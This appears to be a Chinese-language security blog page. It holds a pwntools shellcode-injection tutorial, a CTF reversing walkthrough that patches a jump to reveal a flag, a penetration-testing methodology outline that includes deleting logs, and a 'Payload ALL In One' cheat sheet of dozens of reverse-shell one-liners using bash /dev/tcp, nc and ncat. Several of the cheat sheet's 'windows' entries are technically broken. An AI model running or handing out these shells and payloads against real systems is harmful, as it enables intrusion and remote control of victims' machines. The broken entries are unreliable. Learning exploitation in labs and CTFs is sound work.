<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char shellcode[0x30] 已經在記憶體中配置了 0x30 (48) 個字節的空間，用於儲存字符數據。</span><br><span class="line"></span><br><span class="line">而 read 函數中的第三個參數 0x30，則是指定讀入數據的長度。也就是讀入多少個字節的數據到 shellcode 數組中。</span><br><span class="line"></span><br><span class="line">這兩個參數的意義是不同的，**前者是為 shellcode 數組分配多少個字節的空間，而後者則是指定讀入多少個字節的數據到 shellcode 數組中。**</span><br><span class="line"></span><br><span class="line">通常我們需要確保讀入的數據長度不超過 shellcode 數組的大小，以防止越界訪問，導致程式 crash 或者其他安全問題。</span><br></pre></td></tr></table></figure>

<p>在C语言中，函数指针是一种指向函数的指针。<strong>函数指针的类型</strong>是由函数的<strong>返回值类型和参数类型决定</strong>的。在这段代码中，使用函数指针调用函数的语法如下：</p>
<p>((函数指针类型)(函数指针))(函数参数);</p>
<p>在这个代码中，shellcode数组的类型是char<em>，而**函数指针的类型是void(</em>)(void)，也就是一个无返回值**，无参数的函数指针。所以，需要使用强制类型转换将shellcode数组转换为函数指针。</p>
<p>最后，使用函数指针调用该函数即可。</p>
<p>如果不將 shellcode 數組轉換成函數指針，並直接呼叫它，那麼程式將會執行 shellcode 數組中的字符串，而不是執行它所指向的函數。</p>
<p>這可能導致程式崩潰或其他未預期的錯誤。</p>
<p>另外若未進行強制轉換，而在原本設置的char shellcode[0x30]的空間中執行的是字符陣列，可能會被當成字串處理而不是可執行的程式碼.</p>
<p>所以, 要將 shellcode 數組轉換成函數指針並呼叫它，是為了確保程式正確執行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span> <span class="comment"># 導入 pwn 庫，並設置目標程序為 64 位元</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>] <span class="comment"># 設置使用 tmux 來啟動終端，並在横向分割視窗下運行</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./demo_shellcode&#x27;</span>)<span class="comment"># 啟動名為 demo_shellcode 的程序，並將它與 Python 代碼連接</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># execve(&quot;/bin/sh&quot;, 0, 0)</span></span><br><span class="line">sc = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax, 0x3b  #使用 mov 指令將值 0x3b 儲存在 rax 寄存器中，這個值對應到 execve() 系統調用。</span></span><br><span class="line"><span class="string">xor rsi, rsi   #使用 xor 指令將 rsi 寄存器的值設置為0，這是 execve() 系統調用的第二個參數，表示環境變量的地址。</span></span><br><span class="line"><span class="string">xor rdx, rdx   #使用 xor 指令將 rdx 寄存器的值設置為0，這是 execve() 系統調用的第三個參數，表示傳遞給新程序的命令列參數的地址。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 0x68732f6e69622f  #使用 mov 指令將值 0x68732f6e69622f 儲存在 rdi 寄存器中，這是 &#x27;/bin/sh&#x27; 的 ASCII 碼的反組合，</span></span><br><span class="line"><span class="string">mov qword ptr [rbp], rdi   #將 rdi 寄存器中的值儲存到 rbp 指向的記憶體位址中，也就是將 &quot;/bin/sh&quot; 放入記憶體中</span></span><br><span class="line"><span class="string">mov rdi, rbp               #使用 mov 指令將 rbp 的值存入 rdi, 這樣可以讓 rdi 指向記憶體中的 &quot;/bin/sh&quot;</span></span><br><span class="line"><span class="string">syscall  #呼叫 execve() 系統調用，並且使用之前在寄存器中設置的參數，從而執行 &quot;/bin/sh&quot;。  execve(&quot;/bin/sh&quot;, 0, 0)。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">使用 asm 函數將指定的 assembly 程式碼轉換為字節碼。</span></span><br><span class="line"><span class="string">這裡定義了一個名為 sc 的字節數組，其中存儲了一段 shellcode,</span></span><br><span class="line"><span class="string">這段 shellcode 包括了使用 syscall 指令呼叫 execve() 的操作，參數是 &quot;/bin/sh&quot;, 0, 0 。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">在程序中通過將 shellcode 數組轉換為函數指針並呼叫它，就能執行這段 shellcode 的程式碼。</span></span><br><span class="line"><span class="string">並且因為 execve() 系統調用會開啟一個新的 shell，所以在這段程式碼執行之後，使用者將能夠在新的 shell 中進行操作。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(sc) &lt;= <span class="number">0x30</span>) <span class="comment">#使用 assert() 函數，檢查 sc 的長度是否小於等於0x30，若不是就會產生一個錯誤。</span></span><br><span class="line"></span><br><span class="line">gdb.attach(r) <span class="comment"># 使用 gdb.attach() 函數，與 r 連接的程序 (demo_shellcode) 附加到 GDB 调试器。</span></span><br><span class="line">r.sendafter(<span class="string">&quot;Give me shellcode: &quot;</span>, sc)<span class="comment"># 通過 sendafter() 函數，在等待 &quot;Give me shellcode: &quot; 後進行輸入，將 sc 字節數組中的內容發送到程序中。</span></span><br><span class="line"></span><br><span class="line">r.interactive() <span class="comment">#使用 interactive() 函數，啟動交互式的輸入輸出，將控制台的輸入和輸出與程序連接起來。 在這個狀態下，使用者可以與程序互動，控制程序的流程。</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">總的來說, 這個程式的主要功能為使用交互式方式執行，通過GDB调试器附加到一個名為 demo_shellcode 的程式</span></span><br><span class="line"><span class="string">並將可執行的程式碼傳入到程式中執行，進而得到一個可操作shell。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>.&#x2F;demo_shellcode.py →進入gdb以及開啟</li>
</ul>
<h2 id="gdb-poc"><a href="#gdb-poc" class="headerlink" title="gdb poc"></a>gdb poc</h2><ul>
<li><p>先編譯c</p>
<ul>
<li>gcc -z execstack -o test test.c</li>
</ul>
</li>
<li><p>執行gdb</p>
<ul>
<li>gdb file</li>
<li>disas main</li>
<li>b main<ul>
<li>b *addr</li>
</ul>
</li>
<li>r</li>
<li>c</li>
<li>si</li>
<li>ni</li>
<li>秀記憶體位址<ul>
<li><p>在gef的stack區塊看到+0x0000、+0x0008…+0x0038的資訊</p>
</li>
<li><p>想往後看記憶體位置時，因當前沒有看到想看到的位址資訊</p>
<p>  <img src="/img/pwn_Untitled_15.png" alt="Untitled"></p>
</li>
<li><p>最後一行是+0x0038</p>
<ul>
<li><p>x&#x2F;1xg 0x007fffffffe280</p>
<ul>
<li>他會顯示0x7fffffffe280: 0x0000000000000000</li>
</ul>
</li>
<li><p>x&#x2F;8xg 0x007fffffffe280</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7fffffffe280: 0x0000000000000000      0x00007ffff7ffdad0</span><br><span class="line">0x7fffffffe290: 0x0000000000000001      0x00007ffff7df118a</span><br><span class="line">0x7fffffffe2a0: 0x00007fffffffe390      0x0000555555555159</span><br><span class="line">0x7fffffffe2b0: 0x0000000155554040      0x00007fffffffe3a8</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<p>  NISRA_pwn0_gdb</p>
<ul>
<li>先用ghidra開啟檔案</li>
</ul>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>.(<span class="type">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	get_flag();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  在x86組合語言中，<strong>cmp指令是用來比較兩個數值的指令，它會將兩個操作數相減</strong>，然後根據結果設置標誌位（也就是EFLAGS寄存器中的標誌位），而不會修改操作數本身。cmp指令的語法是”cmp dest, src”，其中dest是目的操作數，src是源操作數。</p>
<p>  在”cmp edx, eax”這條指令中，edx和eax分別是操作數，它們會被相減，然後根據結果設置標誌位。如果edx等於eax，那麼相減的結果為0，因此ZF（零標誌位）會被設置為1，表示相等；否則ZF會被設置為0，表示不相等。在代碼的後面可能有一條jz（jump if zero）指令，它會根據ZF的值決定是否跳轉。如果ZF為1，代表edx等於eax，那麼跳轉指令就會被執行，否則程序就會繼續執行下去。</p>
<p>  因此，如果你希望在cmp edx, eax之後繞過代碼，你需要讓edx等於eax，這樣ZF才會被設置為1，跳轉指令才會被執行。如果edx不等於eax，那麼ZF就會被設置為0，代碼就不會被繞過。</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_flag</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  ulong uVar1;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> local_7c;</span><br><span class="line">  <span class="type">int</span> local_78;</span><br><span class="line">  <span class="type">int</span> local_74;</span><br><span class="line">  uint local_70;</span><br><span class="line">  <span class="type">int</span> local_6c;</span><br><span class="line">  undefined8 local_68;</span><br><span class="line">  undefined8 local_60;</span><br><span class="line">  undefined8 local_58;</span><br><span class="line">  undefined4 local_50;</span><br><span class="line">  undefined2 local_4c;</span><br><span class="line">  undefined local_4a;</span><br><span class="line">  undefined8 local_48;</span><br><span class="line">  undefined8 local_40;</span><br><span class="line">  undefined8 local_38;</span><br><span class="line">  undefined8 local_30;</span><br><span class="line">  undefined8 local_28;</span><br><span class="line">  undefined8 local_20;</span><br><span class="line">  undefined2 local_18;</span><br><span class="line">  undefined local_16;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  local_68 = <span class="number">0x756f795f65766148</span>;</span><br><span class="line">  local_60 = <span class="number">0x65685f726576655f</span>;</span><br><span class="line">  local_58 = <span class="number">0x756f62615f647261</span>;</span><br><span class="line">  local_50 = <span class="number">0x64675f74</span>;</span><br><span class="line">  local_4c = <span class="number">0x3f62</span>;</span><br><span class="line">  local_4a = <span class="number">0</span>;</span><br><span class="line">  local_48 = <span class="number">0x100b021e37252806</span>;</span><br><span class="line">  local_40 = <span class="number">0x54372d170211103d</span>;</span><br><span class="line">  local_38 = <span class="number">0x25f123e30172d12</span>;</span><br><span class="line">  local_30 = <span class="number">0x2631600e11012d11</span>;</span><br><span class="line">  local_28 = <span class="number">0x3c44024d311c123e</span>;</span><br><span class="line">  local_20 = <span class="number">0x8361133460b423a</span>;</span><br><span class="line">  local_18 = <span class="number">0x1901</span>;</span><br><span class="line">  local_16 = <span class="number">0x5f</span>;</span><br><span class="line">  local_6c = open(<span class="string">&quot;/dev/urandom&quot;</span>,<span class="number">0</span>);</span><br><span class="line">  read(local_6c,&amp;local_7c,<span class="number">4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me maigc :&quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00402021,&amp;local_78);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (local_7c == local_78) &#123;</span><br><span class="line">    local_74 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (local_70 = <span class="number">0</span>; local_70 &lt; <span class="number">0x33</span>; local_70 = local_70 + <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">putchar</span>((<span class="type">int</span>)(<span class="type">char</span>)(*(byte *)((<span class="type">long</span>)&amp;local_48 + (<span class="type">long</span>)(<span class="type">int</span>)local_70) ^</span><br><span class="line">                         *(byte *)((<span class="type">long</span>)&amp;local_68 + (<span class="type">long</span>)local_74)));</span><br><span class="line">      local_74 = local_74 + <span class="number">1</span>;</span><br><span class="line">      uVar1 = (ulong)(<span class="type">long</span>)local_74 / <span class="number">0x1f</span>;</span><br><span class="line">      uVar1 = ((<span class="type">long</span>)local_74 - uVar1 &gt;&gt; <span class="number">1</span>) + uVar1 &gt;&gt; <span class="number">4</span>;</span><br><span class="line">      local_74 = local_74 - ((<span class="type">int</span>)(uVar1 &lt;&lt; <span class="number">5</span>) - (<span class="type">int</span>)uVar1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nope~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 == *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  <img src="/img/pwn_Untitled_16.png" alt="Untitled"></p>
<p>  右鍵點Patch instruction 修改JNZ→JZ，該區塊程式就會變成如果相等就直接執行 puts(“Nope~”); 再另外儲存成ELF，重新執行該檔案</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (local_7c == local_78) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nope~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    local_74 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (local_70 = <span class="number">0</span>; local_70 &lt; <span class="number">0x33</span>; local_70 = local_70 + <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">putchar</span>((<span class="type">int</span>)(<span class="type">char</span>)(*(byte *)((<span class="type">long</span>)&amp;local_48 + (<span class="type">long</span>)(<span class="type">int</span>)local_70) ^</span><br><span class="line">                         *(byte *)((<span class="type">long</span>)&amp;local_68 + (<span class="type">long</span>)local_74)));</span><br><span class="line">      local_74 = local_74 + <span class="number">1</span>;</span><br><span class="line">      uVar1 = (ulong)(<span class="type">long</span>)local_74 / <span class="number">0x1f</span>;</span><br><span class="line">      uVar1 = ((<span class="type">long</span>)local_74 - uVar1 &gt;&gt; <span class="number">1</span>) + uVar1 &gt;&gt; <span class="number">4</span>;</span><br><span class="line">      local_74 = local_74 - ((<span class="type">int</span>)(uVar1 &lt;&lt; <span class="number">5</span>) - (<span class="type">int</span>)uVar1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>  換成</p>
<ul>
<li>gdb pwn0_gdb</li>
<li>gef➤ disas get_flag</li>
<li>b *0x0000000000401325</li>
<li>r</li>
</ul>
<p>  <img src="/img/pwn_Untitled_17.png" alt="Untitled"></p>
<p>  <img src="/img/pwn_Untitled_18.png" alt="Untitled"></p>
<p>  前面原始碼有看到，相同才會並執行到這裡面的命令</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (local_7c == local_78) &#123;</span><br><span class="line">   local_74 = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> (local_70 = <span class="number">0</span>; local_70 &lt; <span class="number">0x33</span>; local_70 = local_70 + <span class="number">1</span>) &#123;</span><br><span class="line">     <span class="built_in">putchar</span>((<span class="type">int</span>)(<span class="type">char</span>)(*(byte *)((<span class="type">long</span>)&amp;local_48 + (<span class="type">long</span>)(<span class="type">int</span>)local_70) ^</span><br><span class="line">                        *(byte *)((<span class="type">long</span>)&amp;local_68 + (<span class="type">long</span>)local_74)));</span><br><span class="line">     local_74 = local_74 + <span class="number">1</span>;</span><br><span class="line">     uVar1 = (ulong)(<span class="type">long</span>)local_74 / <span class="number">0x1f</span>;</span><br><span class="line">     uVar1 = ((<span class="type">long</span>)local_74 - uVar1 &gt;&gt; <span class="number">1</span>) + uVar1 &gt;&gt; <span class="number">4</span>;</span><br><span class="line">     local_74 = local_74 - ((<span class="type">int</span>)(uVar1 &lt;&lt; <span class="number">5</span>) - (<span class="type">int</span>)uVar1);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>  <img src="/img/pwn_Untitled_19.png" alt="Untitled"></p>
<p>  把eax，edx給輸出出來兩個數值並不同，所以這裡把edx給改成0就可以相同了</p>
<p>  <img src="/img/pwn_Untitled_20.png" alt="Untitled"></p>
<p>  最後改好再執行</p>
<p>  <img src="/img/pwn_Untitled_21.png" alt="Untitled"></p>
</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-PenTest-Method" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/PenTest-Method/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.091Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/PenTest-Method/">
        The Ethical Hacker Methodology
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <ul>
<li>道德駭客攻擊</li>
<li>滲透測試或白帽駭客攻擊</li>
<li>採用結構化方法來識別和解決電腦系統和網路中的漏洞</li>
<li>過程通常涉及以下五個階段<ul>
<li><p><strong>Reconnaissance</strong></p>
<ul>
<li>收集有關目標系統或網路的資訊</li>
<li>包括被動資訊收集技術，例如搜尋公開資訊、瀏覽網站和檢查 DNS 記錄</li>
<li>目標是收集盡可能多的信息以了解目標並確定潛在的切入點</li>
</ul>
</li>
<li><p><strong>Scanning</strong></p>
<ul>
<li>主動探測目標系統或網絡</li>
<li>發現開放埠、服務和漏洞</li>
<li>使用了各種工具和技術，例如連接埠掃描、網路映射和漏洞掃描</li>
<li>識別可以利用的潛在弱點</li>
</ul>
</li>
<li><p><strong>Gaining Access</strong></p>
<ul>
<li>試圖獲得對目標系統或網路的未經授權的存取</li>
<li>利用掃描階段發現的漏洞</li>
<li>採用密碼破解、社會工程和利用軟體漏洞等技術來存取目標系統</li>
</ul>
</li>
<li><p><strong>Maintaining Access</strong></p>
<ul>
<li>保持對受感染系統或網路的存取</li>
<li>此階段涉及繞過安全機制、設定後門或遠端存取工具以及建立持久存取</li>
<li>目的是模仿真實攻擊者的行為並評估成功入侵的潛在影響。</li>
</ul>
</li>
<li><p><strong>Covering Tracks</strong></p>
<ul>
<li>從目標系統或網路中刪除其活動的任何痕跡</li>
<li>刪除日誌、修改或刪除檔案以及將系統還原到原始狀態</li>
<li>目標是確保道德駭客活動不被發現，不留下任何滲透測試活動的證據</li>
</ul>
</li>
</ul>
</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-payload" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/payload/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.090Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/payload/">
        Payload ALL In One
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Reverse-shell"><a href="#Reverse-shell" class="headerlink" title="Reverse shell"></a>Reverse shell</h2><ul>
<li>一種網路通信，其中建立從遠端主機（「攻擊者」）到目標主機（「受害者」）的連接</li>
<li>攻擊者能夠在受害者的電腦上執行命令，就好像他們在受害者的電腦上執行指令一樣</li>
<li>透過利用受害者系統中的漏洞或誘騙受害者來運行建立 reverse shell 的惡意程式完成</li>
</ul>
<hr>
<p>example IP: 127.0.0.1<br>example Port: 4444</p>
<h3 id="For-Linux-MAC"><a href="#For-Linux-MAC" class="headerlink" title="For Linux&#x2F;MAC"></a>For Linux&#x2F;MAC</h3><ul>
<li>Bash -i</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- sh -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- /bin/sh -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- /bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- cmd -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- powershell -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- pwsh -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Bash 196</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; /bin/sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; /bin/bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; cmd &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; powershell &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; pwsh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Bash read line</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac/windows</span><br><span class="line">- exec 5&lt;&gt;/dev/tcp/127.0.0.1/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Bash 5</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- sh -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line">- /bin/sh -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line">- bash -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line">- /bin/bash -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- cmd -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line">- powershell -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line">- pwsh -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Bash udp</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- sh -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- /bin/sh -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- bash -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- /bin/bash -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- cmd -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- powershell -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- pwsh -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>nc mkfifo</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|powershell -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|pwsh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>nc -e</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- nc 127.0.0.1 4444 -e sh</span><br><span class="line">- nc 127.0.0.1 4444 -e /bin/sh</span><br><span class="line">- nc 127.0.0.1 4444 -e bash</span><br><span class="line">- nc 127.0.0.1 4444 -e /bin/bash</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- nc 127.0.0.1 4444 -e cmd</span><br><span class="line">- nc 127.0.0.1 4444 -e powershell</span><br><span class="line">- nc 127.0.0.1 4444 -e pwsh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>nc -c</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- nc -c sh 127.0.0.1 4444</span><br><span class="line">- nc -c /bin/sh 127.0.0.1 4444</span><br><span class="line">- nc -c bash 127.0.0.1 4444</span><br><span class="line">- nc -c /bin/bash 127.0.0.1 4444</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- nc -c cmd 127.0.0.1 4444</span><br><span class="line">- nc -c powershell 127.0.0.1 4444</span><br><span class="line">- nc -c pwsh 127.0.0.1 4444</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>ncat -e</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- ncat 127.0.0.1 4444 -e sh</span><br><span class="line">- ncat 127.0.0.1 4444 -e /bin/sh</span><br><span class="line">- ncat 127.0.0.1 4444 -e bash</span><br><span class="line">- ncat 127.0.0.1 4444 -e /bin/bash</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- ncat 127.0.0.1 4444 -e cmd</span><br><span class="line">- ncat 127.0.0.1 4444 -e powershell</span><br><span class="line">- ncat 127.0.0.1 4444 -e pwsh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>ncat udp</li>
</ul>
